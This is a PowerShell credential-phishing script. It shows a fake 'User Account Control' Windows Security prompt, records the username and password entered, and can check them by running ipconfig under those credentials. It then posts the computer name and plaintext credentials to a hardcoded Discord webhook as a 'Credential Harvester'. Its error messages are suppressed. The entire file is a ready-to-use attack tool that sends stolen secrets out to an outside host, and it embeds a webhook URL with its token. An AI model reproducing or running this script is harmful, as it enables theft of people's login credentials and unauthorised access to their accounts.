# Discord webhook configuration
$discordWebhookUrl = "https://discord.com/api/webhooks/1335234608458891375/4iUykKNybf7HW4j4VMXF6MSa1j6IRVGP3--L9NgDjIz5v_TXu3dl0R22Y7CeiT47PQeZ"

# prompt
$targetUser = $env:username
$companyEmail = "public.bc.fi"
$promptCaption = "User Account Control"
$promptMessage = "Windows Security"
$maxTries = 1  # maximum number of times to invoke prompt
$delayPrompts = 2  # seconds between prompts
$validateCredentials = $false  # interrupt $maxTries and immediately exfil if credentials are valid

function sendToDiscord(){
    $payload = @{
        content = "Captured credentials: $capturedCreds"
        username = "Credential Harvester"
    }
    
    try {
        Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
        Write-Host "Data sent to Discord successfully"
    }
    catch {
        Write-Host "Failed to send data to Discord: $_"
    }
}

function testCredentials(){
    $securePassword = ConvertTo-SecureString -AsPlainText $phish.CredentialPassword -Force
    $secureCredentials = New-Object System.Management.Automation.PSCredential($phish.CredentialUsername, $securePassword)
    Start-Process ipconfig -Credential $secureCredentials
    return $?
}

Add-Type -AssemblyName System.Runtime.WindowsRuntime
$asTask = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ` 
    ? { $_.Name -eq 'AsTask' -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
[void][Windows.Security.Credentials.UI.CredentialPicker, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
$asTask = $asTask.MakeGenericMethod(([Windows.Security.Credentials.UI.CredentialPickerResults]))
$opt = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
$opt.AuthenticationProtocol = 0
$opt.Caption = $promptCaption
$opt.Message = $promptMessage
$opt.TargetName = '1'
$count = 0
$ErrorActionPreference = 'SilentlyContinue'
[system.collections.arraylist]$harvestCredentials = @()

while (!($validPassword -Or $count -eq $maxTries)){
    start-sleep -s $delayPrompts
    $phish = $asTask.Invoke($null, @(([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($opt)))).Result
    [void]$harvestCredentials.Add($phish.CredentialUsername + ':' + $phish.CredentialPassword)
    if (!($phish.CredentialPassword) -Or !($phish.CredentialUsername)){
        Continue
    }
    if ($validateCredentials){
        $validPassword = testCredentials
    }
    $count++
}

$capturedCreds = $env:computername + '[' + ($harvestCredentials -join ',') + ']'

# Send captured data to Discord
sendToDiscord